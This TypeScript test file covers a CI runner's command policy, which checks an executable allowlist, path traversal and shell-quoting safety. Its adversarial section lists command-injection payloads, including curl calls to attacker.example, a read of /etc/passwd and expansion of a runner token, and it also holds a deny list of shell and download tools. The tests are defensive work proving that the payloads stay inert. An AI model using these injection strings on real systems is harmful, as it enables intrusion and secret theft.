import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { validateCommand, buildSafeShellCommand, shellQuoteArg, ALLOWED_EXECUTABLES, type ExecutionCommand } from "../../src/runner/command-policy.js";

// This module's quoting targets POSIX sh (the real production target: a Cloudflare Sandbox Linux
// container). Node's own `execSync(..., {shell: true})` defaults to cmd.exe on Windows dev machines,
// which uses entirely different quoting rules - so these tests explicitly force a real POSIX shell
// rather than silently testing the wrong shell's semantics on Windows. On win32 that's Git Bash's
// bash.exe (already relied on throughout dev sessions on this machine); everywhere else - including the
// real GitHub Actions Linux runner, where this exact hardcoded Windows path doesn't exist and made every
// one of these tests fail in real CI (found 2026-08-23, commit 843aa1e) - it's the platform's own
// /bin/bash, already always present on the ubuntu-latest runner this project's CI workflow uses.
const REAL_POSIX_SHELL = process.platform === "win32" ? "C:/Program Files/Git/usr/bin/bash.exe" : "/bin/bash";
function runViaRealShell(shellLine: string): string {
  return execFileSync("node", ["-e", `const r = require('child_process').execSync(process.argv[1], {shell: process.argv[2], encoding: 'utf8'}); process.stdout.write(r);`, shellLine, REAL_POSIX_SHELL], { encoding: "utf8" });
}

describe("validateCommand - Part 4 command policy", () => {
  it("preserves approved Go build context and rejects arbitrary environment overrides", () => {
    const command = { executable: "go", args: ["test", "./lib"], env: { GOOS: "linux", GOFLAGS: "" } };
    assert.equal(validateCommand(command).ok, true);
    assert.match(buildSafeShellCommand(command), /GOOS='linux' GOFLAGS='' 'go'/);
    assert.equal(validateCommand({ ...command, env: { PATH: "/tmp/untrusted" } }).violation, "environment_not_allowed");
  });
  it("allows every R2-permitted executable", () => {
    for (const executable of ALLOWED_EXECUTABLES) {
      assert.equal(validateCommand({ executable, args: [] }).ok, true);
    }
  });

  it("rejects an arbitrary executable outright", () => {
    for (const bad of ["bash", "sh", "curl", "wget", "/bin/rm", "python", "perl"]) {
      const result = validateCommand({ executable: bad, args: [] });
      assert.equal(result.ok, false);
      assert.equal(result.violation, "executable_not_allowed");
    }
  });

  it("rejects an empty executable", () => {
    assert.equal(validateCommand({ executable: "", args: [] }).ok, false);
  });

  it("rejects a null byte in an argument or the executable", () => {
    assert.equal(validateCommand({ executable: "node", args: ["safe", "un\0safe"] }).violation, "null_byte_in_argument");
    assert.equal(validateCommand({ executable: "no\0de", args: [] }).violation, "null_byte_in_executable");
  });

  it("rejects path traversal in cwd", () => {
    assert.equal(validateCommand({ executable: "npm", args: [], cwd: "/workspace/../etc" }).violation, "path_traversal_in_cwd");
    assert.equal(validateCommand({ executable: "npm", args: [], cwd: "../secrets" }).violation, "path_traversal_in_cwd");
  });

  it("accepts a real, well-formed workspace cwd", () => {
    assert.equal(validateCommand({ executable: "npm", args: ["test"], cwd: "/workspace/job-abc123" }).ok, true);
  });
});

describe("buildSafeShellCommand - throws on policy violation, never silently degrades", () => {
  it("throws for a disallowed executable rather than building an unsafe command", () => {
    assert.throws(() => buildSafeShellCommand({ executable: "bash", args: ["-c", "whoami"] }), /refusing to build/);
  });
});

// --- Part 5: adversarial command-injection tests ------------------------------------------------
// Every payload below is placed as an ARGUMENT VALUE (never the executable, which is separately
// allowlisted) to a permitted executable, then run through the REAL system shell (execFileSync +
// /bin/sh, or Windows-appropriate equivalent - this repo's own dev/CI shell) to prove the payload
// never becomes shell syntax, not merely that the quoted string LOOKS safe.
const INJECTION_PAYLOADS: Array<{ label: string; payload: string }> = [
  { label: "command separator ;", payload: "; curl http://attacker.example/pwned" },
  { label: "command chaining &&", payload: "&& curl http://attacker.example/pwned" },
  { label: "command substitution $()", payload: "$(curl http://attacker.example/pwned)" },
  { label: "backtick substitution", payload: "`curl http://attacker.example/pwned`" },
  { label: "pipe |", payload: "| curl http://attacker.example/pwned" },
  { label: "output redirection >", payload: "> /tmp/pwned-by-diffci-test" },
  { label: "path traversal in an argument (not cwd)", payload: "../../../../etc/passwd" },
  { label: "newline injection", payload: "safe-looking-arg\ncurl http://attacker.example/pwned" },
  { label: "single quote breakout attempt", payload: "'; curl http://attacker.example/pwned; '" },
  { label: "dollar-sign variable expansion", payload: "$HOME $PATH $DIFFCI_RUNNER_TOKEN" },
  { label: "background execution &", payload: "curl http://attacker.example/pwned &" },
  { label: "glob expansion attempt", payload: "*" },
];

describe("Part 5: adversarial injection tests - real shell execution proof", () => {
  for (const { label, payload } of INJECTION_PAYLOADS) {
    it(`"${label}" is treated as a single inert literal argument, never shell syntax`, () => {
      // node -e prints its own argv so we can see EXACTLY what the shell delivered as arguments -
      // if injection succeeded, argv would be split/mangled or a curl process would have been
      // attempted (there is no network in this test sandbox, so any injected command would fail
      // loudly rather than silently, but the real proof is argv fidelity below). Note: `node -e
      // <script> args...`'s own process.argv does NOT include "-e" or the eval string itself -
      // Node consumes those as CLI flags, not user argv - confirmed live; only the args AFTER the
      // eval string appear, starting at index 1 (index 0 is the node binary path).
      const command: ExecutionCommand = { executable: "node", args: ["-e", "console.log(JSON.stringify(process.argv.slice(1)))", "MARKER_BEFORE", payload, "MARKER_AFTER"] };
      const shellLine = buildSafeShellCommand(command);

      const stdout = runViaRealShell(shellLine);
      const argv = JSON.parse(stdout.trim().split("\n").pop()!) as string[];
      assert.deepEqual(argv, ["MARKER_BEFORE", payload, "MARKER_AFTER"], `the payload must arrive byte-for-byte as a single argv element, exactly as constructed - never re-interpreted`);
    });
  }

  it("real proof: an injected curl call never actually runs - stdout contains only the expected marker, nothing from a second command", () => {
    const workdir = mkdtempSync(join(tmpdir(), "diffci-r2-injection-"));
    try {
      const proofFile = join(workdir, "proof.txt").replace(/\\/g, "/");
      const payload = `; echo INJECTED > ${proofFile}`;
      const command: ExecutionCommand = { executable: "node", args: ["-e", "console.log('only-this-should-run')", payload] };
      const shellLine = buildSafeShellCommand(command);
      runViaRealShell(shellLine);
      // The injected `echo INJECTED > proofFile` must never have run - the proof file must not exist.
      assert.throws(() => execFileSync("node", ["-e", `require('fs').readFileSync(process.argv[1])`, proofFile]), /ENOENT/, "the injected redirection must never have created this file");
    } finally {
      rmSync(workdir, { recursive: true, force: true });
    }
  });
});

describe("shellQuoteArg - the core escaping primitive", () => {
  it("wraps a plain value in single quotes", () => {
    assert.equal(shellQuoteArg("hello"), "'hello'");
  });
  it("escapes an embedded single quote correctly (close, escaped-quote, reopen)", () => {
    assert.equal(shellQuoteArg("it's"), "'it'\\''s'");
  });
  it("real shell round-trip: quoting and unquoting via an actual shell recovers the exact original string, for every payload", () => {
    for (const value of [...INJECTION_PAYLOADS.map((p) => p.payload), "", " ", "a b  c", "line1\nline2", "back\\slash", "'''''"]) {
      const printerCommand = buildSafeShellCommand({ executable: "node", args: ["-e", "process.stdout.write(process.argv[1])", value] });
      const stdout = runViaRealShell(printerCommand);
      assert.equal(stdout, value, `round-trip failed for: ${JSON.stringify(value)}`);
    }
  });
});
